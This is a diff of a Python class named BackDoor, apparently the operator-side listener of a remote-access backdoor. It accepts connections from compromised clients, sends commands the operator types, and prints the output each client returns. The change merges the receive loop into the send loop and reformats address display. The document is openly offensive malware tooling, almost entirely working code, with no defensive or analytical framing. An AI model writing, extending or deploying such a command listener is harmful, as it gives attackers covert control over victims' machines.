@@ -18,36 +18,27 @@ class BackDoor():
         while self.KEEP_GOING:
             client, address = self.s.accept()
 
-            self.print_msg(f'New connection: {str(address)}')
+            self.print_msg(f'New connection: {address[0]}:{address[1]}')
 
             send_thread = threading.Thread(group=None, target=self.send, args=(client, address), daemon=True)
             send_thread.start()
 
-            receive_thread = threading.Thread(group=None, target=self.receive, args=(client, address), daemon=True)
-            receive_thread.start()
-
     def send(self, client, address):
         while self.KEEP_GOING:
             try:
-                cmd = input(f'{address}>>>: ')
+                cmd = input(f'{address[0]}:{address[1]}>>>: ')
                 client.send(cmd.encode('utf-8'))
-            except:
-                self.print_msg('Failed to send command to client')
-                self.KEEP_GOING = False
 
-    def receive(self, client, address):
-        while self.KEEP_GOING:
-            try:
                 data = client.recv(1024).decode('utf-8')
 
                 if not data or 'closed' in data:
                     self.print_msg(f'Connection with host: {address} closed')
                     self.KEEP_GOING = False
 
-                print(f'{address}>>>: {data}')
-                self.print_msg(f'{address}>>>: Enter a new command')
+                print(f'{address[0]}:{address[1]}>>>: {data}')
+
             except:
-                self.print_msg(f'Failed to receive data from host: {address}')
+                self.print_msg('Failed to send command to client')
                 self.KEEP_GOING = False
 
     def print_msg(self, msg):
